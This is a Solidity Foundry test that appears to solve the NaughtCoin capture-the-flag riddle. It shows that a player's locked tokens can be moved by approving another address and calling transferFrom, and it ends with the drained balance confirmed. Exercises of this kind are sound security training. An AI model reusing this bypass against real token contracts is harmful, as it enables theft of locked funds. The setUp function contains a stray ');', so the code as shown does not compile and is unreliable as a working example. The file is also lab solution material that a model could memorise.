// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.15;

import {Test} from "forge-std/Test.sol";
import {NaughtCoin} from "../../src/solidity-riddles/NaughtCoin.sol";

/// @title NaughtCoin_Test
/// @author Surbhi Audichya
contract NaughtCoin_Test is Test {
    NaughtCoin private coin;
    address private player = makeAddr("player");
    address private bob = makeAddr("Bob");
    address private alice = makeAddr("Alice");

    function setUp() public {
        coin = new NaughtCoin(player););
    }

    // Players can approve another address to transfer tokens on their behalf using the `approve` function.
    // This allows the approved address to transfer tokens from the player's balance freely.
    function test_AttackTransfer() external {
        // test player is not able to transfer before
        vm.startPrank(player);
        vm.expectRevert();
        coin.transfer(alice, 10 * 10 ** 18);
        coin.approve(bob, type(uint256).max);
        vm.stopPrank();
        vm.startPrank(bob);
        coin.transferFrom(player, bob, coin.balanceOf(player));
        assertEq(coin.balanceOf(player), 0);
        coin.transfer(alice, 10 * 10 ** 18);
    }
}
